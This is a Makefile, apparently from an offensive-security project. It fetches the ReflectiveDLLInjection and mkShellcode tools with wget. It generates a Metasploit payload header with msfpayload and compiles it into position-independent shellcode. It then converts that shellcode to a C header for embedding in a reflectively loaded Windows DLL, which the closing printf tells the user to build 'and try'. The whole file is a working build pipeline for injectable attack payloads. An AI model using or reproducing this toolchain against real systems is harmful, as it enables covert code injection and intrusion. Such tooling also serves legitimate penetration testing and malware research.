all: shellcode.h
	wget -c https://github.com/stephenfewer/ReflectiveDLLInjection/archive/master.zip
	unzip -n master.zip
	rm master.zip
	printf "copy shellcode.h and ReflectiveDll.c to ReflectiveDLLInjection-master/dll/src/\nThen go compile the dll in Visual Studio and try it...\n"

shellcode.o: shellcode.c msfpayload.h
	gcc -m32 -march=i386 -fno-stack-protector -fno-common -Os -fomit-frame-pointer -fno-PIC -c -static shellcode.c

mkshellcode.py: elftools
	wget -c https://github.com/feliam/mkShellcode/archive/master.zip
	unzip -jo master.zip "*loader_x86.s" "*mkshellcode.py" -d ./
	rm -f master.zip
elftools:
	wget https://bitbucket.org/eliben/pyelftools/get/249a5ca85159.zip
	unzip 249a5ca85159.zip
	mv eliben-pyelftools-249a5ca85159/elftools .
	rm -Rf eliben-pyelftools-249a5ca85159
	rm -f 249a5ca85159.zip
	cd ..

shellcode.bin: mkshellcode.py shellcode.o
	python mkshellcode.py shellcode.o shellcode.bin

shellcode.h: shellcode.bin
	python bin2c.py shellcode.bin >shellcode.h


msfpayload.h:
	msfpayload4.4 `cat config` C > msfpayload.h

clean:
	rm -Rf elftools  loader.o  loader_x86.s  mkshellcode.py  msfpayload.h    shellcode.o

distclean: clean
	rm -f shellcode.bin shellcode.h
	rm -Rf ReflectiveDLLInjection-master
